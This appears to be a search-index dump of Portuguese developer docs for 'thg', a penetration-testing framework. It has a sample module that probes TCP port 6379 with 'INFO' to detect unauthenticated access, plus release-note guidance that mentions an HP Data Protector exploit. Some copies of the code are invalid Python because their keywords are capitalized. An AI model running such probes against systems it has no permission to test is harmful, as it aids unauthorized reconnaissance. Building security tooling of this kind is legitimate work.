\"name\": \"base\", \"description\": \"descricao da modulo\", \"author\": [\"darkcode\"], \"references\": [ \"referencia \", ], \"disclosure_date\": \"data do modulo\", \"service_name\": \"nome do servico\", \"service_version\": \"versao do servico\", }) # Como o modulo so preciasa do thg, entao\u3002 self.register_tcp_target(port_value=6379) def check(self): #Esses tr\u00eas par\u00e2metros s\u00e3o registrados pelo m\u00e9todo de destino self.register tcp, que pode ser chamado diretamente aqui. host = self.options.get_option(\"HOST\") port = int(self.options.get_option(\"PORT\")) timeout = int(self.options.get_option(\"TIMEOUT\")) #Todo o processo de execu\u00e7\u00e3o do teste \u00e9 melhor colocado na tentativa(try) e, em seguida, capturar o erro no except diretamente chamando self.results.failure para imprimir o erro. try: socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(bytes(\"INFO\\r\\n\", encoding=\"utf-8\")) result = s.recv(1024) if bytes(\"INFO\", encoding=\"utf-8\") in result: #Existe uma lacuna, a chamada dos dados deste m\u00e9todo pode ser passada para um dicion\u00e1rio, sendo atualmente in\u00fatil ou n\u00e3o. self.results.success( data={ \"host\": host, \"port\": port, }, #Como v\u00e1rios alvos podem ser executados, \u00e9 melhor escrever o destino e a porta no resultado para facilitar a identifica\u00e7\u00e3o. message=\"Host {host}:{port} exists *** unauthorized vulnerability\".format(host=host, port=port) ) else: # N\u00e3o existe vulnerabilidade. Chame o m\u00e9todo self.results.failure para passar a mensagem de erro self.results.failure( error_message=\"Host {host}:{port} does not exists *** unauthorized vulnerability\".format( host=host, port=port ) ) except Exception as e: # Erro de execu\u00e7\u00e3o, use self.results.failure para passar a mensagem de erro. self.results.failure(error_message=\"Host {host}:{port}: {error}\".format(host=host, port=port, error=e)) return self.results def exploit(self): return self.check() Writing module Aqui est\u00e1 um exemplo de uma vulnerabilidade de acesso n\u00e3o autorizado. Primeiro crie o arquivo: /modules/__tipo_do_modulo__/__nome__/__nome_modulo__.py Introduzir a classe Base{BaseExploit/BaseAuxiliary/BasePost/BasePayload/BaseNops/BaseEvasion} e dentro da class base{que voce escolheu} tem a class BaseOption e o nome da class tem que do modulo tem que ser Modules , herdando a classe Base{mod} Todos os m\u00f3dulos devem herdar a classe Base{mode} e o nome da classe deve ser Modules e a class BaseOption e automaticamente importada para registrar os par\u00e2metros do m\u00f3dulo. Declarar a classe Modules Primeira classe de escrita :: from lib.BaseMode.mods.Auxiliary.Auxiliary import BaseAuxiliary from lib.BaseMode.mods.Evasion.Evasion import BaseEvasion from lib.BaseMode.mods.Exploit.Exploit import BaseExploit from lib.BaseMode.mods.Nops.Nops import BaseNops from lib.BaseMode.mods.Payload.Payload import BasePayload from lib.BaseMode.mods.Post.Post import BasePost from lib.BaseMode.mods.Osint.Osint import BaseOsint class Modules(BaseAuxiliary): pass Complete the init method Ent\u00e3o complete o m\u00e9todo __init__ : :: def __init__(self): super(Modules, self).__init__() self.thg_update_info({ \"name\": \"base\", \"description\": \"descricao da modulo\", \"author\": [\"darkcode\"], \"references\": [ \"referencia \", ], \"disclosure_date\": \"data do modulo\", \"service_name\": \"nome do servico\", \"service_version\": \"versao do servico\", }) Self.register_tcp_target(port_value=6379) Para explicar isso, primeiro observe a primeira linha do m\u00e9todo __init__ : :: Super (Modules, self) .__ init __ () Esta linha \u00e9 necess\u00e1ria, e voc\u00ea precisa chamar o m\u00e9todo __init__ da classe pai para inicializar o m\u00f3dulo. Em seguida, atualize as informa\u00e7\u00f5es do m\u00f3dulo usando o m\u00e9todo self.thg_update_info : :: self.thg_update_info({ \"name\": \"base\", \"description\": \"descricao da modulo\", \"author\": [\"darkcode\"], \"references\": [ \"referencia \", ], \"disclosure_date\": \"data do modulo\", \"service_name\": \"nome do servico\", \"service_version\": \"versao do servico\", }) Ent\u00e3o use o m\u00e9todo self.register_tcp_target para registrar um alvo do tipo tcp. Este m\u00e9todo registra automaticamente os seguintes par\u00e2metros para n\u00f3s: self.register_options([ BaseOption(name=\"HOST\", required=True, description=\"The IP address to be tested\"), BaseOption(name=\"PORT\", required=True, description=\"The port to be tested\", value=port_value), BaseOption(name=\"TIMEOUT\", required=True, description=\"Connection timeout\", value=timeout_value), BaseOption(name=\"THREADS\", required=True, description=\"The number of threads\", value=threads_value) ]) Para nossas vulnerabilidades n\u00e3o autorizadas de ****, HOST e PORT s\u00e3o suficientes, portanto n\u00e3o h\u00e1 necessidade de registrar os par\u00e2metros adicionais. Se voc\u00ea precisar registrar par\u00e2metros adicionais, voc\u00ea pode chamar o m\u00e9todo self.register_options , passando uma lista contendo o objeto BaseOption . M\u00e9todo de importa\u00e7\u00e3o automatico da class base que voce escolheu Complete o m\u00e9todo de verifica\u00e7\u00e3o O m\u00e9todo de verifica\u00e7\u00e3o grava principalmente para detectar a exist\u00eancia de uma vulnerabilidade e n\u00e3o h\u00e1 comportamento de ataque. c\u00f3digo mostra como abaixo: Def check(self): Host = self.options.get_option(\"HOST\") Port = int(self.options.get_option(\"PORT\")) Timeout = int(self.options.get_option(\"TIMEOUT\")) Try: Socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) S.connect((host, port)) S.send(bytes(\"INFO\\r\\n\", encoding=\"utf-8\")) Result = s.recv(1024) If bytes(\"mod_version\", encoding=\"utf-8\") in result: Self.results.success( Data={ \"host\": host, \"port\": port, }, Message=\"Host {host}:{port} exists mod unauthorized vulnerability\".format(host=host, port=port) ) Else: Self.results.failure( Error_message=\"Host {host}:{port} does not exists mod unauthorized vulnerability\".format( Host=host, Port=port ) ) Except Exception as e: Self.results.failure(error_message=\"Host {host}:{port}: {error}\".format(host=host, port=port, error=e)) Return self.results Primeiro, as primeiras tr\u00eas linhas usam o m\u00e9todo self.options.get_option () para obter os par\u00e2metros do m\u00f3dulo. Ent\u00e3o o processo exp \u00e9 executado. Execu\u00e7\u00e3o bem-sucedida, encontrou uma vulnerabilidade, chamada de m\u00e9todo self.results.success , dados de entrada e informa\u00e7\u00f5es de sucesso: :: Self.results.success( Data={ \"host\": host, \"port\": port, }, Message=\"Host {host}:{port} exists mod unauthorized vulnerability\".format(host=host, port=port) ) Se a vulnerabilidade n\u00e3o existe, o m\u00e9todo self.results.failure \u00e9 executado, e a mensagem de falha \u00e9 passada em: :: Self.results.failure( Error_message=\"Host {host}:{port} does not exists mod unauthorized vulnerability\".format( Host=host, Port=port ) ) O m\u00e9todo de verifica\u00e7\u00e3o deve retornar self.results :: Return self.results Complete o m\u00e9todo de explora\u00e7\u00e3o Essa vulnerabilidade \u00e9 relativamente simples, portanto, voc\u00ea n\u00e3o pode retornar o m\u00e9todo self.check sem implementar o m\u00e9todo de explora\u00e7\u00e3o. :: Def exploit(self): Return self.check() O m\u00e9todo exploit tamb\u00e9m deve retornar self.results , porque o m\u00e9todo de verifica\u00e7\u00e3o tamb\u00e9m retorna self.results , ent\u00e3o voc\u00ea pode chamar self.check () diretamente. Mais casos Agora que a maior parte da funcionalidade da estrutura foi conclu\u00edda, vou come\u00e7ar a escrever alguns m\u00f3dulos. Voc\u00ea pode consultar os m\u00f3dulos escritos para completar seus pr\u00f3prios m\u00f3dulos. Todos os m\u00f3dulos est\u00e3o no diret\u00f3rio modules do reposit\u00f3rio do github.","title":"Get Started"},{"location":"dev/contributing/Contributing-to-thg/#guia-de-desenvolvimento-de-modulos","text":"Fazer o melhor trabalho requer esfor\u00e7os conjuntos de todos. Todos s\u00e3o bem-vindos para desenvolver m\u00f3dulos, trocar tecnologia de seguran\u00e7a e melhorar as habilidades de desenvolvimento Vou insistir em manter a biblioteca de m\u00f3dulos por um longo tempo e gostaria da ajuda de todos","title":"Guia de desenvolvimento de m\u00f3dulos"},{"location":"dev/contributing/Contributing-to-thg/#visao-geral","text":"Para escrever um m\u00f3dulo completo do thg, voc\u00ea precisa atender aos seguintes requisitos: O m\u00f3dulo deve ser uma class e o nome da classe \u00e9 Modules A classe Modules deve herdar de BaseExploit/BaseAuxiliary/BasePost/BasePayload/BaseNops/BaseEvasion (introduzido por lib.BaseMode.mods import Base* ) O m\u00f3dulo deve conter o m\u00e9todo __init__ , que deve chamar o m\u00e9todo __init__ da classe pai (via super(\"Modules\", self).__init__() ) O m\u00f3dulo deve preencher as informa\u00e7\u00f5es relevantes, usando o m\u00e9todo self.thg_update_info () Os objetivos do POC est\u00e3o atualmente divididos em tipos http e tcp , usando self.register_tcp_target () para registrar alvos do tipo tcp. Registre o tipo de destino http com self.register_http_target () . Ap\u00f3s o registro, o alvo pode ser recuperado usando self.options.get_option . O m\u00e9todo check \u00e9 usado para detectar vulnerabilidades e n\u00e3o h\u00e1 comportamento de ataque. O m\u00e9todo exploit \u00e9 usado para implementar o comportamento de ataque, mas n\u00e3o pode ser usado para afetar a opera\u00e7\u00e3o normal do servidor. Nos m\u00e9todos check e exploit , se o teste for bem sucedido, chame o m\u00e9todo self.results.success () para salvar o resultado. Se falha chamer self.results.failure () para salvar o resultado. No processo de escrever os m\u00f3dulo do thg, se voc\u00ea usar pycharm , voc\u00ea pode seguir o m\u00e9todo acima para ver o c\u00f3digo e melhorar sua compreencao. Se voc\u00ea tiver d\u00favidas ou sugest\u00f5es, n\u00e3o hesite em entrar em contato comigo.","title":"vis\u00e3o geral"},{"location":"dev/contributing/Contributing-to-thg/#darkcode357luiz-gustavo-correa","text":"","title":"darkcode357/luiz gustavo correa"},{"location":"dev/contributing/Contributing-to-thg/#case-test-unauthorized-detection-module","text":"Basic code: :: import socket from lib.BaseMode.mods.Auxiliary.Auxiliary import BaseAuxiliary class Modules(BaseAuxiliary): def __init__(self): super(Modules, self).__init__() self.thg_update_info({ \"name\": \"base\", \"description\": \"descricao da modulo\", \"author\": [\"darkcode\"], \"references\": [ \"referencia \", ], \"disclosure_date\": \"data do modulo\", \"service_name\": \"nome do servico\", \"service_version\": \"versao do servico\", }) # Como o modulo so preciasa do thg, entao\u3002 self.register_tcp_target(port_value=6379) def check(self): #Esses tr\u00eas par\u00e2metros s\u00e3o registrados pelo m\u00e9todo de destino self.register tcp, que pode ser chamado diretamente aqui. host = self.options.get_option(\"HOST\") port = int(self.options.get_option(\"PORT\")) timeout = int(self.options.get_option(\"TIMEOUT\")) #Todo o processo de execu\u00e7\u00e3o do teste \u00e9 melhor colocado na tentativa(try) e, em seguida, capturar o erro no except diretamente chamando self.results.failure para imprimir o erro. try: socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(bytes(\"INFO\\r\\n\", encoding=\"utf-8\")) result = s.recv(1024) if bytes(\"INFO\", encoding=\"utf-8\") in result: #Existe uma lacuna, a chamada dos dados deste m\u00e9todo pode ser passada para um dicion\u00e1rio, sendo atualmente in\u00fatil ou n\u00e3o. self.results.success( data={ \"host\": host, \"port\": port, }, #Como v\u00e1rios alvos podem ser executados, \u00e9 melhor escrever o destino e a porta no resultado para facilitar a identifica\u00e7\u00e3o. message=\"Host {host}:{port} exists *** unauthorized vulnerability\".format(host=host, port=port) ) else: # N\u00e3o existe vulnerabilidade. Chame o m\u00e9todo self.results.failure para passar a mensagem de erro self.results.failure( error_message=\"Host {host}:{port} does not exists *** unauthorized vulnerability\".format( host=host, port=port ) ) except Exception as e: # Erro de execu\u00e7\u00e3o, use self.results.failure para passar a mensagem de erro. self.results.failure(error_message=\"Host {host}:{port}: {error}\".format(host=host, port=port, error=e)) return self.results def exploit(self): return self.check()","title":"Case: test unauthorized detection module"},{"location":"dev/contributing/Contributing-to-thg/#writing-module","text":"Aqui est\u00e1 um exemplo de uma vulnerabilidade de acesso n\u00e3o autorizado. Primeiro crie o arquivo: /modules/__tipo_do_modulo__/__nome__/__nome_modulo__.py Introduzir a classe Base{BaseExploit/BaseAuxiliary/BasePost/BasePayload/BaseNops/BaseEvasion} e dentro da class base{que voce escolheu} tem a class BaseOption e o nome da class tem que do modulo tem que ser Modules , herdando a classe Base{mod} Todos os m\u00f3dulos devem herdar a classe Base{mode} e o nome da classe deve ser Modules e a class BaseOption e automaticamente importada para registrar os par\u00e2metros do m\u00f3dulo.","title":"Writing module"},{"location":"dev/contributing/Contributing-to-thg/#declarar-a-classe-modules","text":"Primeira classe de escrita :: from lib.BaseMode.mods.Auxiliary.Auxiliary import BaseAuxiliary from lib.BaseMode.mods.Evasion.Evasion import BaseEvasion from lib.BaseMode.mods.Exploit.Exploit import BaseExploit from lib.BaseMode.mods.Nops.Nops import BaseNops from lib.BaseMode.mods.Payload.Payload import BasePayload from lib.BaseMode.mods.Post.Post import BasePost from lib.BaseMode.mods.Osint.Osint import BaseOsint class Modules(BaseAuxiliary): pass","title":"Declarar a classe Modules"},{"location":"dev/contributing/Contributing-to-thg/#complete-the-init-method","text":"Ent\u00e3o complete o m\u00e9todo __init__ : :: def __init__(self): super(Modules, self).__init__() self.thg_update_info({ \"name\": \"base\", \"description\": \"descricao da modulo\", \"author\": [\"darkcode\"], \"references\": [ \"referencia \", ], \"disclosure_date\": \"data do modulo\", \"service_name\": \"nome do servico\", \"service_version\": \"versao do servico\", }) Self.register_tcp_target(port_value=6379) Para explicar isso, primeiro observe a primeira linha do m\u00e9todo __init__ : :: Super (Modules, self) .__ init __ () Esta linha \u00e9 necess\u00e1ria, e voc\u00ea precisa chamar o m\u00e9todo __init__ da classe pai para inicializar o m\u00f3dulo. Em seguida, atualize as informa\u00e7\u00f5es do m\u00f3dulo usando o m\u00e9todo self.thg_update_info : :: self.thg_update_info({ \"name\": \"base\", \"description\": \"descricao da modulo\", \"author\": [\"darkcode\"], \"references\": [ \"referencia \", ], \"disclosure_date\": \"data do modulo\", \"service_name\": \"nome do servico\", \"service_version\": \"versao do servico\", }) Ent\u00e3o use o m\u00e9todo self.register_tcp_target para registrar um alvo do tipo tcp. Este m\u00e9todo registra automaticamente os seguintes par\u00e2metros para n\u00f3s: self.register_options([ BaseOption(name=\"HOST\", required=True, description=\"The IP address to be tested\"), BaseOption(name=\"PORT\", required=True, description=\"The port to be tested\", value=port_value), BaseOption(name=\"TIMEOUT\", required=True, description=\"Connection timeout\", value=timeout_value), BaseOption(name=\"THREADS\", required=True, description=\"The number of threads\", value=threads_value) ]) Para nossas vulnerabilidades n\u00e3o autorizadas de ****, HOST e PORT s\u00e3o suficientes, portanto n\u00e3o h\u00e1 necessidade de registrar os par\u00e2metros adicionais. Se voc\u00ea precisar registrar par\u00e2metros adicionais, voc\u00ea pode chamar o m\u00e9todo self.register_options , passando uma lista contendo o objeto BaseOption . M\u00e9todo de importa\u00e7\u00e3o automatico da class base que voce escolheu","title":"Complete the init method"},{"location":"dev/contributing/Contributing-to-thg/#complete-o-metodo-de-verificacao","text":"O m\u00e9todo de verifica\u00e7\u00e3o grava principalmente para detectar a exist\u00eancia de uma vulnerabilidade e n\u00e3o h\u00e1 comportamento de ataque. c\u00f3digo mostra como abaixo: Def check(self): Host = self.options.get_option(\"HOST\") Port = int(self.options.get_option(\"PORT\")) Timeout = int(self.options.get_option(\"TIMEOUT\")) Try: Socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) S.connect((host, port)) S.send(bytes(\"INFO\\r\\n\", encoding=\"utf-8\")) Result = s.recv(1024) If bytes(\"mod_version\", encoding=\"utf-8\") in result: Self.results.success( Data={ \"host\": host, \"port\": port, }, Message=\"Host {host}:{port} exists mod unauthorized vulnerability\".format(host=host, port=port) ) Else: Self.results.failure( Error_message=\"Host {host}:{port} does not exists mod unauthorized vulnerability\".format( Host=host, Port=port ) ) Except Exception as e: Self.results.failure(error_message=\"Host {host}:{port}: {error}\".format(host=host, port=port, error=e)) Return self.results Primeiro, as primeiras tr\u00eas linhas usam o m\u00e9todo self.options.get_option () para obter os par\u00e2metros do m\u00f3dulo. Ent\u00e3o o processo exp \u00e9 executado. Execu\u00e7\u00e3o bem-sucedida, encontrou uma vulnerabilidade, chamada de m\u00e9todo self.results.success , dados de entrada e informa\u00e7\u00f5es de sucesso: :: Self.results.success( Data={ \"host\": host, \"port\": port, }, Message=\"Host {host}:{port} exists mod unauthorized vulnerability\".format(host=host, port=port) ) Se a vulnerabilidade n\u00e3o existe, o m\u00e9todo self.results.failure \u00e9 executado, e a mensagem de falha \u00e9 passada em: :: Self.results.failure( Error_message=\"Host {host}:{port} does not exists mod unauthorized vulnerability\".format( Host=host, Port=port ) ) O m\u00e9todo de verifica\u00e7\u00e3o deve retornar self.results :: Return self.results","title":"Complete o m\u00e9todo de verifica\u00e7\u00e3o"},{"location":"dev/contributing/Contributing-to-thg/#complete-o-metodo-de-exploracao","text":"Essa vulnerabilidade \u00e9 relativamente simples, portanto, voc\u00ea n\u00e3o pode retornar o m\u00e9todo self.check sem implementar o m\u00e9todo de explora\u00e7\u00e3o. :: Def exploit(self): Return self.check() O m\u00e9todo exploit tamb\u00e9m deve retornar self.results , porque o m\u00e9todo de verifica\u00e7\u00e3o tamb\u00e9m retorna self.results , ent\u00e3o voc\u00ea pode chamar self.check () diretamente.","title":"Complete o m\u00e9todo de explora\u00e7\u00e3o"},{"location":"dev/contributing/Contributing-to-thg/#mais-casos","text":"Agora que a maior parte da funcionalidade da estrutura foi conclu\u00edda, vou come\u00e7ar a escrever alguns m\u00f3dulos. Voc\u00ea pode consultar os m\u00f3dulos escritos para completar seus pr\u00f3prios m\u00f3dulos. Todos os m\u00f3dulos est\u00e3o no diret\u00f3rio modules do reposit\u00f3rio do github.","title":"Mais casos"},{"location":"dev/dark/Adding-Release-Notes-to-PRs/","text":"As notas de vers\u00e3o informam nossos usu\u00e1rios sobre o material que estamos enviando em cada vers\u00e3o. Observando nossas notas de vers\u00e3o, nossos usu\u00e1rios devem ser capazes de entender facilmente o que h\u00e1 de novo, o que foi corrigido e o que foi alterado no lan\u00e7amento. Portanto, todos os PRs, exceto pequenas corre\u00e7\u00f5es e ajustes, devem ter notas de vers\u00e3o. Para adicionar uma nota de vers\u00e3o a uma solicita\u00e7\u00e3o pull, voc\u00ea precisar\u00e1 adicion\u00e1-la como um coment\u00e1rio, assim: Voc\u00ea precisar\u00e1 marcar o coment\u00e1rio para inclus\u00e3o nas notas de vers\u00e3o usando o cabe\u00e7alho `# Release Notes '. Depois de aplicar o cabe\u00e7alho das notas de vers\u00e3o, voc\u00ea pode inserir o texto das notas de vers\u00e3o que deseja usar. \u00c9 isso a\u00ed! Depois de adicionar o texto das notas de vers\u00e3o, poderemos extra\u00ed-las das solicita\u00e7\u00f5es pull quando executamos nosso script de notas de vers\u00e3o e compilamos em um \u00fanico documento. Como escrever notas de vers\u00e3o Ok, agora que voc\u00ea sabe como adicionar uma nota de vers\u00e3o, est\u00e1 se perguntando o que deveria escrever. Basicamente, uma nota de vers\u00e3o resume a solicita\u00e7\u00e3o de recebimento e descreve o valor do reparo / recurso para o usu\u00e1rio. Cada nota de vers\u00e3o possui um t\u00edtulo, um n\u00famero PR e uma breve descri\u00e7\u00e3o. Aqui est\u00e1 um exemplo de como uma nota de vers\u00e3o se parece: a class plugin esta funcionando Notas da vers\u00e3o para aprimoramentos Um aprimoramento indica que um aprimoramento ou novo recurso foi adicionado \u00e0 estrutura. Os aprimoramentos incluem itens como m\u00f3dulos auxiliares, m\u00f3dulos p\u00f3s-explora\u00e7\u00e3o e novos payloads. Ao escrever notas de vers\u00e3o para um aprimoramento, tente responder \u00e0s seguintes perguntas: Qual \u00e9 o aprimoramento? Por que \u00e9 valioso ou importante para os usu\u00e1rios? Como eles podem us\u00e1-lo? Por exemplo, a seguir, uma nota de vers\u00e3o para um aprimoramento: Os novos comandos 'plugin $plugin_name, plugins' permite executar pesquisas de plugins Notas da vers\u00e3o para defeitos Um defeito \u00e9 uma corre\u00e7\u00e3o para um problema que fazia com que um recurso ou funcionalidade espec\u00edfico n\u00e3o funcionasse da maneira esperada. Basicamente, um defeito indica que algo foi quebrado e foi corrigido. Ao escrever notas de vers\u00e3o para um defeito, tente responder \u00e0s seguintes perguntas: O que foi quebrado? Como foi consertado? Por que isso \u00e9 importante para os usu\u00e1rios? Aqui est\u00e1 um exemplo de um defeito: O cabe\u00e7alho do email continha cabe\u00e7alhos de data e assunto duplicados, o que fazia com que servidores de email como o AWS SES rejeitassem os emails. Essa corre\u00e7\u00e3o remove os cabe\u00e7alhos duplicados para que as campanhas possam enviar e-mails com \u00eaxito. Notas da vers\u00e3o para explora\u00e7\u00f5es Uma explora\u00e7\u00e3o \u00e9 um m\u00f3dulo que tira proveito de uma vulnerabilidade e fornece algum tipo de acesso ao destino. N\u00f3s chamamos explora\u00e7\u00f5es explicitamente porque elas s\u00e3o gostosas. Ao escrever notas de vers\u00e3o para uma explora\u00e7\u00e3o, tente responder \u00e0s seguintes perguntas: Qual vulnerabilidade o m\u00f3dulo est\u00e1 explorando? Que tipo de acesso voc\u00ea pode obter com o m\u00f3dulo? Voc\u00ea precisa de credenciais para explorar a vulnerabilidade? E, finalmente, aqui est\u00e1 um exemplo de exploits: Este m\u00f3dulo permite explorar o HP Data Protector, um sistema de backup e recupera\u00e7\u00e3o, para carregar remotamente arquivos no compartilhamento de arquivos. As vers\u00f5es 6.10, 6.10 e 6.20 s\u00e3o vulner\u00e1veis. Voc\u00ea n\u00e3o precisa se autenticar para explorar esta vulnerabilidade.","title":"Adding Release Notes to PRs"},{"location":"dev/dark/Adding-Release-Notes-to-PRs/#como-escrever-notas-de-versao","text":"Ok, agora que voc\u00ea sabe como adicionar uma nota de vers\u00e3o, est\u00e1 se perguntando o que deveria escrever. Basicamente, uma nota de vers\u00e3o resume a solicita\u00e7\u00e3o de recebimento e descreve o valor do reparo / recurso para o usu\u00e1rio. Cada nota de vers\u00e3o possui um t\u00edtulo, um n\u00famero PR e uma breve descri\u00e7\u00e3o. Aqui est\u00e1 um exemplo de como uma nota de vers\u00e3o se parece: a class plugin esta funcionando","title":"Como escrever notas de vers\u00e3o"},{"location":"dev/dark/Adding-Release-Notes-to-PRs/#notas-da-versao-para-aprimoramentos","text":"Um aprimoramento indica que um aprimoramento ou novo recurso foi adicionado \u00e0 estrutura. Os aprimoramentos incluem itens como m\u00f3dulos auxiliares, m\u00f3dulos p\u00f3s-explora\u00e7\u00e3o e novos payloads. Ao escrever notas de vers\u00e3o para um aprimoramento, tente responder \u00e0s seguintes perguntas: Qual \u00e9 o aprimoramento? Por que \u00e9 valioso ou importante para os usu\u00e1rios? Como eles podem us\u00e1-lo? Por exemplo, a seguir, uma nota de vers\u00e3o para um aprimoramento: Os novos comandos 'plugin $plugin_name, plugins' permite executar pesquisas de plugins","title":"Notas da vers\u00e3o para aprimoramentos"},{"location":"dev/dark/Adding-Release-Notes-to-PRs/#notas-da-versao-para-defeitos","text":"Um defeito \u00e9 uma corre\u00e7\u00e3o para um problema que fazia com que um recurso ou funcionalidade espec\u00edfico n\u00e3o funcionasse da maneira esperada. Basicamente, um defeito indica que algo foi quebrado e foi corrigido. Ao escrever notas de vers\u00e3o para um defeito, tente responder \u00e0s seguintes perguntas: O que foi quebrado? Como foi consertado? Por que isso \u00e9 importante para os usu\u00e1rios? Aqui est\u00e1 um exemplo de um defeito: O cabe\u00e7alho do email continha cabe\u00e7alhos de data e assunto duplicados, o que fazia com que servidores de email como o AWS SES rejeitassem os emails. Essa corre\u00e7\u00e3o remove os cabe\u00e7alhos duplicados para que as campanhas possam enviar e-mails com \u00eaxito.","title":"Notas da vers\u00e3o para defeitos"},{"location":"dev/dark/Adding-Release-Notes-to-PRs/#notas-da-versao-para-exploracoes","text":"Uma explora\u00e7\u00e3o \u00e9 um m\u00f3dulo que tira proveito de uma vulnerabilidade e fornece algum tipo de acesso ao destino. N\u00f3s chamamos explora\u00e7\u00f5es explicitamente porque elas s\u00e3o gostosas. Ao escrever notas de vers\u00e3o para uma explora\u00e7\u00e3o, tente responder \u00e0s seguintes perguntas: Qual vulnerabilidade o m\u00f3dulo est\u00e1 explorando? Que tipo de acesso voc\u00ea pode obter com o m\u00f3dulo? Voc\u00ea precisa de credenciais para explorar a vulnerabilidade? E, finalmente, aqui est\u00e1 um exemplo de exploits: Este m\u00f3dulo permite explorar o HP Data Protector, um sistema de backup e recupera\u00e7\u00e3o, para carregar remotamente arquivos no compartilhamento de arquivos. As vers\u00f5es 6.10, 6.10 e 6.20 s\u00e3o vulner\u00e1veis. Voc\u00ea n\u00e3o precisa se autenticar para explorar esta vulnerabilidade.","title":"Notas da vers\u00e3o para explora\u00e7\u00f5es"},{"location":"dev/dark/Bundled-Modules-Proposal/","text":"M\u00f3dulos inclu\u00eddos Criado por darkcode0x00 \u00c0 medida que os m\u00f3dulos Metasploit continuam a crescer em n\u00famero e capacidade, a atual separa\u00e7\u00e3o das informa\u00e7\u00f5es dos m\u00f3dulos por tipo se torna mais complicada. A partir do pr\u00f3ximo ano, queremos que todos os arquivos relacionados a um m\u00f3dulo (documentos, bibliotecas, fontes, informa\u00e7\u00f5es de compila\u00e7\u00e3o, etc.) vivam o mais pr\u00f3ximo poss\u00edvel e sejam o mais hacker poss\u00edvel. Para esse fim, criamos o conceito de \"pacotes de m\u00f3dulos\" para ajudar a melhorar o isolamento de depend\u00eancias do m\u00f3dulo e a localiza\u00e7\u00e3o das informa\u00e7\u00f5es. Esperamos que o formato seja flex\u00edvel o suficiente para acomodar a ampla gama de m\u00f3dulos que temos e uniforme o suficiente para n\u00e3o causar confus\u00e3o entre os membros da comunidade e colaboradores. Eventualmente, podemos at\u00e9 empacotar cada m\u00f3dulo separadamente para distribui\u00e7\u00e3o. \u00c9 incerto se esse formato de pacote suportar\u00e1 ou n\u00e3o o estilo antigo do m\u00f3dulo. Poderia ser feito para funcionar, eu acho, mas exigiria um pouco de esfor\u00e7o e ingenuidade para funcionar corretamente. Por uma quest\u00e3o de simplicidade, descreverei o conceito de pacote como ele se aplica aos m\u00f3dulos externos / coldstone e, em seguida, descreverei poss\u00edveis adapta\u00e7\u00f5es no final. Estrutura do diret\u00f3rio class / plugin Exemplo de m\u00f3dulo python : thgc create darkcode -t thgclass tree --dirsfirst --charset=ascii -F class_name/ class_plugins_name/ |-- docs/ |-- imagens/ |-- requirements/ | |-- base.txt | |-- dev.txt | |-- prod.txt | `-- test.txt |-- test_thg_plugin_class/ | |-- __init__.py | |-- pylintrc | `-- test_myplugin.py |-- thg_plugin_class/ | `-- source/ | |-- __init__.py | |-- myplugin.py | `-- pylintrc |-- thg_plugin_class_example/ | `-- example.py |-- build-pyenvs.sh |-- CHANGELOG.md |-- LICENSE.md |-- Pipfile |-- Pipfile.lock |-- README.md |-- setup.cfg |-- setup.py |-- tasks.py `-- tox.init 7 directories, 21 files plugin thgc create plugins_name -t thgplugin root@darkcode:/# tree --dirsfirst --charset=ascii -F plugins_name/ plugins_name/ |-- docs/ |-- imagens/ |-- requirements/ | |-- base.txt | |-- dev.txt | |-- prod.txt | `-- test.txt |-- test_thg_plugin/ | |-- __init__.py | |-- pylintrc | `-- test_myplugin.py |-- thg_plugin/ | `-- source/ | |-- __init__.py | |-- pylintrc | `-- thg_plugin.py |-- thg_plugin_example/ | `-- thg_plugin.py |-- build-pyenvs.sh |-- CHANGELOG.md |-- LICENSE.md |-- Pipfile |-- Pipfile.lock |-- README.md |-- setup.cfg |-- setup.py |-- tasks.py `-- tox.init 7 directories, 21 files modulos info - O execut\u00e1vel principal recebe o nome do m\u00f3dulo (igual ao diret\u00f3rio) - Os arquivo do modulos s\u00e3o todos corelacionados - N\u00f3s permitiremos v\u00e1rios m\u00f3dulos, tendo intera\u00e7\u00e3o um com outro, porem n\u00e3o recomendamos essa estrutura de dependencia (por exemplo, integra\u00e7\u00e3o 2 dois modulos simutaneamente, recomendo submeter a brach master para realaplicao do modulo com depend\u00eancia multiplas) Arquivos necess\u00e1rios Para manter a sobrecarga no m\u00ednimo para os hackers que est\u00e3o desenvolvendo m\u00f3dulos, precisamos minimizar os arquivos que o autor precisar\u00e1 criar, modificar e entender para a maioria das tarefas (atualizado: todos os arquivos que um autor deve criar devem estar diretamente relacionados a determinados e especializados funcionalidade que eles desejam como parte da prepara\u00e7\u00e3o ou execu\u00e7\u00e3o de um m\u00f3dulo). O m\u00f3dulo mais m\u00ednimo requer apenas que o execut\u00e1vel principal esteja presente. Ao carregar os m\u00f3dulos, o framework ver\u00e1 um diret\u00f3rio principal sem certos arquivos esperados e gerar\u00e1 os padr\u00e3o automaticamente. Esse comportamento pode ser posteriormente aumentado com a adivinha\u00e7\u00e3o de quais padr\u00f5es com base no que est\u00e1 presente no diret\u00f3rio. - Se o pyinvoke estiver ausente, o framework ir\u00e1 gerar um que fa\u00e7a refer\u00eancia \u00e0s tarefas de py compartilhadas. - Se o pipenv estiver ausente e o execut\u00e1vel terminar em .py, o framework ir\u00e1 gerar um que dependa das bibliotecas do modulo. - Toda essa l\u00f3gica de gera\u00e7\u00e3o deve estar dispon\u00edvel no thgscaffolding Mantendo tudo perto Uma das desvantagens do sistema de m\u00f3dulos atual \u00e9 que todos os arquivos relacionados ao desenvolvimento, documenta\u00e7\u00e3o e execu\u00e7\u00e3o de um m\u00f3dulo vivem em locais diferentes. Algumas informa\u00e7\u00f5es, como depend\u00eancias, s\u00e3o rastreadas apenas implicitamente ou com perdas no c\u00f3digo ou nas especifica\u00e7\u00f5es de n\u00edvel superior da estrutura. Isso determina de forma program\u00e1tica o que \u00e9 um m\u00f3dulo, \u00e9 direcionado ou requer um c\u00f3digo fr\u00e1gil. Informa\u00e7\u00f5es da vers\u00e3o Todas as informa\u00e7\u00f5es adicionais de compila\u00e7\u00e3o devem ser especificadas como tarefas do m\u00f3dulo desenvolvido. Tanto quanto poss\u00edvel, isso tamb\u00e9m deve incluir a cria\u00e7\u00e3o de ambientes IDE, como o Visual Studio. Mesmo que os bin\u00e1rios sejam verificados para reduzir os requisitos de tempo de 